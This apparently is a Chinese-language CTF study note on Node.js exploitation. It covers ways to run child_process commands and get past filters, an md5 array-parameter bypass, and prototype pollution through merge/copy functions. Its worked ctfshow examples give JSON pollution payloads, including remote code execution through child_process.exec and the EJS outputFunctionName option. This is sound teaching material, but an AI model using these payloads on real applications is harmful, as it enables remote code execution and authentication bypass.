---
weight: 999
title: "NodeJs"
description: ""
icon: "article"
date: "2025-05-29T16:38:45+08:00"
lastmod: "2025-05-29T16:38:45+08:00"
draft: false
toc: true
---
# 命令执行
```js
require('child_process').exec('ls'); //返回值是child_process，不能转字符串
require('child_process').execSync('ls').toString(); //返回值是字符串
require('child_process').spawnSync('ls').stdout.toString();// 返回object，toString转成字符串
//绕过简单的限制
require('child_process')['exe'+'cSync']('ls').toString()
```
不用`child_process`读取文件
```js
__filename //获取当前文件的绝对路径
__dirname //获取当前文件解析过后的文件夹的绝对路径
require('fs').readFileSync(__filename,'utf-8'); //读取当前文件
require('fs').readdirSync('.') //读取当前目录下所有文件
```
# md5
```js
if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag))
```
>传入a[]=1&b[]=2
>得到的是['1']和['2']
>而nodejs中数组和字符串的拼接如下：

```js
console.log(5+[6,6]); //56,6
console.log("5"+6); //56
console.log("5"+[6,6]); //56,6
console.log("5"+["6","6"]); //56,6
```

>则['a']+flag== 'a'+flag

如果传入的是非数字索引，比如`[x]=1`，那么就会变为js的对象`{x:'1'}`
```js
let a={
    x:'1'
}
console.log(a+"flag{123}")
//返回的是： [object Object]flag{123}
```
>所以传入a[x]=1&b[x]=1也能绕过，此时`a!==b`比较的是内存地址，而不是键值。

# 原型链污染
```js
//定义一个类
function Foo() {
    this.bar = 1
}

new Foo()

//类内的方法
function Foo() {
    this.bar = 1
    this.show = function() {
        console.log(this.bar)
        this.bar=this.bar+1
    }
}

(new Foo()).show() //输出1
//但是每次新建一个foo对象，this.show就会执行一次，show方法是绑定在对象上的，而不是绑定在类上
//使用原型prototype创建类时，就会只创建一次show方法。
function Foo() {
    this.bar = 1
}

Foo.prototype.show = function show() {
    console.log(this.bar)
}

let foo = new Foo()
foo.show() //输出1
//原型prototype是类Foo的一个属性，所有实例化的对象，都有这个熟悉的内容。
//foo对象天生就有show方法
//通过proto属性可以访问类的原型，即：
foo.__proto__==Foo.prototype
```
>总结：
>`prototype`是一个类的属性，所有类对象实例化时都会有`prototype`中的属性和方法

# js中的继承
js中的继承使用的便是`prototype`
```js
function Father() {
    this.first_name = 'Donald'
    this.last_name = 'Trump'
}

function Son() {
    this.first_name = 'Melania'
}

Son.prototype = new Father()

let son = new Son()
console.log(`Name: ${son.first_name} ${son.last_name}`)
//输出：Name: Melania Trump
//此过程为：在son中找last_name，如果找不到就在son.__proto__找，如果还找不到，就在son.__proto__.__proto__里找，依次寻找直到null结束，如Object.prototype的__proto__就是null
```

# 原型链污染
## 原理
可以访问原型，也可以修改原型的值
```js
let foo = {bar: 1}

// foo.bar 此时为1
console.log(foo.bar)

// 修改foo的原型（即Object）
foo.__proto__.bar = 2

// 由于查找顺序的原因，foo.bar仍然是1
console.log(foo.bar)

// 此时再用Object创建一个空的zoo对象
let zoo = {}

// 查看zoo.bar
console.log(zoo.bar)
//尽管zoo为空对象，依然输出了1 1 2
//foo.__proto__实际上是一个Object类的实例，所以其实是给这个类新增了一个bar属性。所以新建的zoo继承Object，自然也有bar属性
```
## 使用场景
找到能控制的数组（对象）的键名的操作即可
- 对象merge
- 对象clone

```js
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}
```
存在`target[key]` = `source[key]`，如果`key`为`__proto__`呢

```js
let o1 = {}
let o2 = {a: 1, "__proto__": {b: 2}}
merge(o1, o2)
console.log(o1.a, o1.b)
// 输出1 2
o3 = {}
console.log(o3.b)
//输出空
```
合并成功了，但是原型链没有被污染。
因为创建o2的过程`let o2 = {a: 1, "__proto__": {b: 2}}`中，`__proto__"`已经代表o2的原型了，遍历键名，得到的是`a，b`，而不是`a,__proto__`，也就无法修改原型
```js
let o1 = {}
let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)
//输出1 2 2，原型链被污染
```
因为在json解析下，`__proto__`是一个真正的键名，而不代表原型，后面遍历o2时也能正常获取键名。
## 例题：
### 1
```js
router.post('/', require('body-parser').json(),function(req, res, next) {

  res.type('html');

  var flag='flag_here';

  var secert = {};

  var sess = req.session;

  let user = {};

  utils.copy(user,req.body);

  if(secert.ctfshow==='36dboy'){

    res.end(flag);

  }else{

    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  

  }

});
```
因为存在`utils.copy`函数
```js
function copy(object1, object2){

    for (let key in object2) {

        if (key in object2 && key in object1) {

            copy(object1[key], object2[key])

        } else {

            object1[key] = object2[key]

        }

    }

  }
```
所以有原型链污染
传入payload：
```json
{
    "username": "a",
    "__proto__": {
        "ctfshow": "36dboy"
    }
}
```

### 2
```js
router.post('/', require('body-parser').json(),function(req, res, next) {

  res.type('html');

  res.render('api', { query: Function(query)(query)});

});
```
>因为所有变量的最顶层是`object`，所以若当前上下文不存在`query`，会自动向上查找`object`的`query`属性，故可以进行原型链污染

```json
{"username":"admin","password":"admin","__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('id')"}}
```

### 3
```js
router.post('/', require('body-parser').json(),function(req, res, next) {

  res.type('html');

  var flag='flag_here';

  var user = new function(){

    this.userinfo = new function(){

    this.isVIP = false;

    this.isAdmin = false;

    this.isAuthor = false;    

    };

  }

  utils.copy(user.userinfo,req.body);

  if(user.userinfo.isAdmin){

   res.end(flag);

  }else{

   return res.json({ret_code: 2, ret_msg: '登录失败'});  

  }
```

`user.__proto__`不是`Object`，是`f()`。`user.__proto__.__proto__`才是，所以需要污染两层。
```json
{
    "__proto__": {
        "__proto__": {
            "query": "return global.process.mainModule.constructor._load('child_process').exec('id')"
        }
    }
}
```
### 4
```js
router.get('/', function(req, res, next) {

  res.type('html');

  res.render('index');

});
```
ejs rce
```json
{"__proto__":{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('id');var __tmp2"}}}
```

# get绕过
```js
router.get('/', function(req, res, next) {
  res.type('html');
  var flag = 'flag_here';
  if(req.url.match(/8c|2c|\,/ig)){
  	res.end('where is flag :)');
  }
  var query = JSON.parse(req.query.query);
  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){
  	res.end(flag);
  }else{
  	res.end('where is flag. :)');
  }

});
```
正常传入
```json
{
    "name": "admin",
    "password": "ctfshow",
    "isVIP": true
}
```
但过滤了`,`和`/2c`，所以即便`req.url`不进行url解码，也无法传入逗号。
利用`req.query.query`的特性：传入的相同get参数会加入一个数组，然后`JSON.parse`会把数组内的元素拼接在一起。
也就是传入`query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}`的话，第一步得到`['{"name":"admin"','"password":"ctfshow"','"isVIP":true}']`，第二步就是目标json。
使用%63是防止`"`编码后的`%22`和`C`变为`2c`被过滤。